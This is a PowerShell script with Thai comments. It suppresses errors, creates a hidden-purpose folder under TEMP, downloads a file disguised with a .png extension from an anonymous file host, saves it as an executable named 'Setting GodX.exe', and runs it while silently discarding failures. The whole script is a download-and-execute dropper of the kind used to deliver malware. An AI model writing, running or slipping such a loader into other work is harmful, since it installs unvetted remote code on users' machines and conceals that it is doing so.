# ปิดการแสดงผล
$ErrorActionPreference = 'SilentlyContinue'

$exeName = "Setting GodX.exe"
$tempPath = "$env:TEMP\GodX_App"
$exePath = "$tempPath\$exeName"
$url = "https://files.catbox.moe/c7lpiz.png"

# 1. สร้างโฟลเดอร์แบบเงียบ
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath -Force | Out-Null }

# 2. ดาวน์โหลดและเปลี่ยนนามสกุลในคำสั่งเดียว (ประหยัดเวลา)
try {
    Invoke-WebRequest -Uri $url -OutFile $exePath -ErrorAction Stop
    
    # 3. รันโปรแกรมแบบแยกกระบวนการออกมา (เพื่อให้ PowerShell ปิดตัวลงได้)
    Start-Process -FilePath $exePath -WorkingDirectory $tempPath -WindowStyle Normal
} catch {
    # หากโหลดไม่ได้ ไม่ต้องทำอะไร
}
